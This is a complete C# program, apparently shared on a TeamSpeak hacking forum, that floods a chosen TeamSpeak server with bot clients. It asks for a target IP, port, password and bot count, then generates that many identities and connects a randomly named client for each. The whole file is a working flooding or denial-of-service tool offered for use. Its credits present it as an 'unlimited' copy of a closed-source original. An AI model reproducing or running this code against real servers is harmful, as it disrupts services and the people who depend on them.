using System;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Runtime.InteropServices;

using TS3Client;
using TS3Client.Full;
using System.Threading;
using System.IO;

namespace TeamSpeak_FCKCS
{
    class Program
    {
        [DllImport("Kernel32")]
        private static extern bool SetConsoleCtrlHandler(EventHandler handler, bool add);

        private delegate bool EventHandler(CtrlType sig);
        static EventHandler _handler;

        enum CtrlType
        {
            CTRL_C_EVENT = 0,
            CTRL_BREAK_EVENT = 1,
            CTRL_CLOSE_EVENT = 2,
            CTRL_LOGOFF_EVENT = 5,
            CTRL_SHUTDOWN_EVENT = 6
        }
        public static bool exitSystem = false;
        public static Random random = new Random();
        public static List<Ts3FullClient> Clients = new List<Ts3FullClient>();
        static void Main()
        {
            try
            {
                Console.Title = "TeamSpeak Bot Spawner [Codename: FCKCS]";
                Console.OutputEncoding = Encoding.UTF8;

                _handler += new EventHandler(Handler);
                SetConsoleCtrlHandler(_handler, true);

                new Program().Worker().GetAwaiter().GetResult();

                while (!exitSystem)
                {
                    Thread.Sleep(5000);
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine(Ex.Message);
            }
        }

        public async Task Worker()
        {
            BaseInterface();

            Console.WriteLine("Yo Sucker, enter IP:");
            string IP = Console.ReadLine();

            BaseInterface();

            Console.WriteLine("Yo Sucker, enter a Port:");
            ushort.TryParse(Console.ReadLine(), out ushort Port);

            BaseInterface();

            Console.WriteLine("Yo Sucker, require a Security Level: ");
            int.TryParse(Console.ReadLine(), out int SecurityLevel);

            BaseInterface();

            Console.WriteLine("Yo Sucker, how many Bots you want to spawn? ");
            int.TryParse(Console.ReadLine(), out int BotsToSpawn);

            BaseInterface();

            Console.WriteLine("Yo Sucker, delay between connections(ms): ");
            int.TryParse(Console.ReadLine(), out int Delay);

            BaseInterface();

            Console.WriteLine("Yo Sucker, Password of the Server?");
            string Password = Console.ReadLine();

            await Spawner(IP, Port, SecurityLevel, BotsToSpawn, Delay, Password);
        }

        public async Task Spawner(string IP, ushort Port, int SecurityLevel, int Bots, int Delay, string Password)
        {
            List<IdentityData> Identities = new List<IdentityData>();
            Ts3FullClient Client = null;
            
            try
            {
                Console.WriteLine("Generating Identities..");
                for (int i = 1; i <= Bots; i++)
                {
                    Identities.Add(Ts3Crypt.GenerateNewIdentity(SecurityLevel));
                    Console.WriteLine($"Generated: {i}/{Bots}");
                }

                foreach (IdentityData Identity in Identities)
                {
                    Client = new Ts3FullClient(EventDispatchType.AutoThreadPooled); ;
                    string BotName = GenerateName();

                    Console.WriteLine($"Connecting Bot with Name: {BotName} using Identity {Identity.PublicKeyString}");

                    ConnectionDataFull Connection = new ConnectionDataFull()
                    {
                        Hostname = IP,
                        Port = Port,
                        Username = BotName,
                        Identity = Identity,
                        Password = Password
                    };

                    Client.Connect(Connection);
                    Client.QuitMessage = "https://r4p3.net [Stay W4RM]";
                    Clients.Add(Client);

                    await Task.Delay(Delay);
                }
            }
            catch (Exception Ex)
            {
                Console.WriteLine($"{Ex.Message}");
                Console.Read();
            }
            finally
            {
                BaseInterface();

                Console.WriteLine("Done!");
                Console.WriteLine($"{Clients.Count}/{Bots} on {IP}");
            }
        }

        public void BaseInterface()
        {
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.DarkGreen;

            Console.WriteLine(@" _________        ______    ________    ______  ___  ____    ______   ______   ");
            Console.WriteLine(@"|  _   _  |      / ____ `. |_   __  | .' ___  ||_  ||_  _| .' ___  |.' ____ \  ");
            Console.WriteLine(@"|_/ | | \_|.--.  `'  __) |   | |_ \_|/ .'   \_|  | |_/ /  / .'   \_|| (___ \_| ");
            Console.WriteLine(@"    | |   ( (`\] _  |__ '.   |  _|   | |         |  __'.  | |        _.____`.  ");
            Console.WriteLine(@"   _| |_   `'.'.| \____) |  _| |_    \ `.___.'\ _| |  \ \_\ `.___.'\| \____) | ");
            Console.WriteLine(@"  |_____| [\__) )\______.' |_____|    `.____ .'|____||____|`.____ .' \______.' ");
            Console.WriteLine(@"                                                                               ");

            Console.WriteLine("Credits: ");
            Console.WriteLine(@"Splamy | Reversing the TeamSpeak Client and making it Public");
            Console.WriteLine(@"tagKnife | Fucker who posted this Closed Source and limited.");
            Console.WriteLine(@"Kleberstoff | Idiot who made the unlimited and OpenSource.");

            Console.ForegroundColor = ConsoleColor.White;

            Console.WriteLine();
        }

        public string GenerateName(int Length = 8)
        {
            const string Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
            return new string(Enumerable.Repeat(Chars, Length)
            .Select(s => s[random.Next(s.Length)]).ToArray());
        }

        private static bool Handler(CtrlType sig)
        {
            foreach (Ts3FullClient Client in Clients)
            {
                Client.Disconnect();
            }

            //allow main to run off
            exitSystem = true;

            //shutdown right away so there are no lingering threads
            Environment.Exit(-1);

            return true;
        }
    }
}
